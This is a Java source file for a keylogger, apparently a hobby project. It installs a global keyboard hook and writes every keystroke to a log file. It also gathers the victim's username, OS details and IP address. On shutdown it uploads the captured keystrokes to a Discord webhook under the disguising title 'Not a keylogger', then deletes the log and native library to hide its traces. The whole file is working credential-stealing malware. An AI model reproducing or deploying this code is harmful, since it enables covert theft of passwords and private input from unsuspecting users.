package com.pvtoari.keylogger;

import java.io.*;
import java.net.*;
import java.util.Date;
import java.awt.*;
import java.awt.event.KeyEvent;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class Listener implements NativeKeyListener {
	private static PrintWriter pw;
	private int counting = 0;
	private static boolean caps = Toolkit.getDefaultToolkit().getLockingKeyState(KeyEvent.VK_CAPS_LOCK); // true if caps lock is on, false otherwise
	private static boolean isShift = false;
	private static boolean isAlt = false;
	private static boolean isControl = false; 
	
	public Listener() {
		try {
			pw = new PrintWriter("log.txt");
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		}
	}
	
	public static boolean isLatinLetter(String s) {
		String aux = s;
		aux=aux.toLowerCase();
		return aux.length() == 1 && aux.charAt(0) >= 'a' && aux.charAt(0) <= 'z';
	}
	
	public String parseCap(String s) {
		String res = "";

		if(!isLatinLetter(s) && isShift) {
			switch(s) {
				// this is causing me a seizure
				case "1": res="!"; break;
				case "2": res="\""; break;
				case "3": res="·"; break;
				case "4": res="$"; break;
				case "5": res="%"; break;
				case "6": res="&"; break;
				case "7": res="/"; break;
				case "8": res="("; break;
				case "9": res=")"; break;
				case "0": res="="; break;
			}
		}
		return res;
	}

	public void nativeKeyReleased(NativeKeyEvent e) {

		switch(e.getKeyCode()) {
			case NativeKeyEvent.VC_SHIFT: 
				caps=false;
				isShift=false;
				break;
			case NativeKeyEvent.VC_ALT: 
				isAlt = false;
				break;
		}
	}

	public void nativeKeyPressed(NativeKeyEvent e) {
		this.counting++;
		String toAppend = NativeKeyEvent.getKeyText(e.getKeyCode());

		if(!isLatinLetter(toAppend) && isShift) {
			toAppend = parseCap(toAppend);	
		}

		switch(e.getKeyCode()) {
			case NativeKeyEvent.VC_CAPS_LOCK: 
				caps=!caps; 
				break;
			case NativeKeyEvent.VC_SHIFT: 
				caps=true;
				isShift = true;
				break;
			case NativeKeyEvent.VC_SPACE: 
				pw.append(" ");
				break;
			case NativeKeyEvent.VC_ENTER: 
				pw.append("\n");
				break;
			case NativeKeyEvent.VC_ALT: 
				isAlt = true;
				break;
			default: {
				if(caps==false) toAppend=toAppend.toLowerCase();
				pw.append(toAppend);
			}
		}

		if (this.counting == 48) {
			pw.append("\n");
			this.counting = 0;
		}
	}
	
	public String getClientInfo() {
		String username = System.getProperty("user.name");
		String os = System.getProperty("os.name");
		String osVersion = System.getProperty("os.version");
		String javaVersion = System.getProperty("java.version");
		String ipAddress = "Unknown";
	
		try {
			InetAddress inetAddress = InetAddress.getLocalHost();
			ipAddress = inetAddress.getHostAddress();
		} catch (UnknownHostException e) {
			e.printStackTrace();
		}
		
		//using double slash special character since Discord explods if u want to process a
		// string like "\nHello", using "\\n" instead
		return "Username: " + username + "\\n" +
			   "Operating System: " + os + "\\n" +
			   "OS Version: " + osVersion + "\\n" +
			   "Java Version: " + javaVersion + "\\n" +
			   "IP Address: " + ipAddress + "\\n" +
			   "Running at: " + new Date().toString();
	}

	private void deleteTraces() {
		File log = new File("log.txt");
		if (log.exists()) {
			log.delete();
		}

		File dll = new File("JNativeHook.x86_64.dll");
		if (dll.exists()) {
			dll.delete();
		}
	}

	public void start() {
		try {
			GlobalScreen.registerNativeHook();
		}
		catch (NativeHookException ex) {
			System.exit(1);
		}
		
		GlobalScreen.addNativeKeyListener(new Listener());

		
		Runtime.getRuntime().addShutdownHook(new Thread()
			{
				@Override
				public void run() {
					pw.flush();

					try {
            			Main.webhook.addEmbed(new DiscordWebhook.EmbedObject()
                    	.setTitle("Not a keylogger")
                    	.setDescription("Captured keystrokes sent.")
                    	.setColor(new Color(Color.ORANGE.getRGB()))
            			);

						Main.webhook.execute();
           				Main.webhook.sendFile(".\\log.txt");
        			} catch (IOException e) {
            			//e.printStackTrace();
						Main.webhook.setContent("```Error sending log file.```");
        			} finally {
						pw.close();
						deleteTraces();
					}
				}
			});
	}
}